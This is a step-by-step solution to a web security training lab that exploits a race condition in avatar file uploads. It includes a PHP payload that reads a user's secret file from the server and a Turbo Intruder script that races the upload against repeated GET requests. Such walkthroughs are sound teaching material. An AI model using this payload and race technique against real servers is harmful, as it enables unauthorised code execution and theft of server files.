## Solution steps

- Open Burp Suite and set-up proxy.
- Keep the intercept off.
- Log in using the given credentials and upload an image as your avatar, then go back to your account page.
- In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE>.
- On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret. For example: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- Attempt to upload the script as your avatar. Observe that the server appears to successfully prevent you from uploading files that aren't images.
- If you haven't already, add the Turbo Intruder extension to Burp from the BApp store.
- Right-click on the POST /my-account/avatar request that was used to submit the file upload and select Extensions > Turbo Intruder > Send to turbo intruder. The Turbo Intruder window opens.
- Copy and paste the following script template into Turbo Intruder's Python editor:
```python
  def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
- In the script, replace <YOUR-POST-REQUEST> with the entire POST /my-account/avatar request containing your exploit.php file.
- Replace <YOUR-GET-REQUEST> with a GET request for fetching your uploaded PHP file. The simplest way to do this is to copy the GET /files/avatars/<YOUR-IMAGE> request from your proxy history, then change the filename in the path to exploit.php.
- At the bottom of the Turbo Intruder window, click Attack. This script will submit a single POST request to upload your exploit.php file, instantly followed by 5 GET requests to /files/avatars/exploit.php.
- In the results list, notice that some of the GET requests received a 200 response containing Carlos's secret. These requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted.
- Submit the secret to solve the lab.
